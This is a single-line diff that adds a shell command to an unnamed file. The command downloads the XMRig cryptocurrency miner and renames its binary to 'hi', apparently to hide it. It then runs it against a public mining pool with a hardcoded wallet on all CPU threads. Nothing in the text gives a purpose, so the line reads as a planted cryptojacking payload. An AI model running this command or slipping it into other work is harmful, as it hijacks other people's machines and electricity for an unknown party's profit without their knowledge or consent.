@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz && tar -zxvf xmrig-6.18.1-linux-x64.tar.gz && cd xmrig-6.18.1 && mv xmrig hi && ./hi --donate-level 5 -o pool.hashvault.pro:443 -u 4AkzFMKu9J1cPzFZz2cU98Sgjm7J7SCieYEEVYRH1GZu4qPyYgwybniLZvzYRjsduhSs6azweYP3wgzz7pr2qGbFKBeZu5Q -k --tls --threads $(nproc)
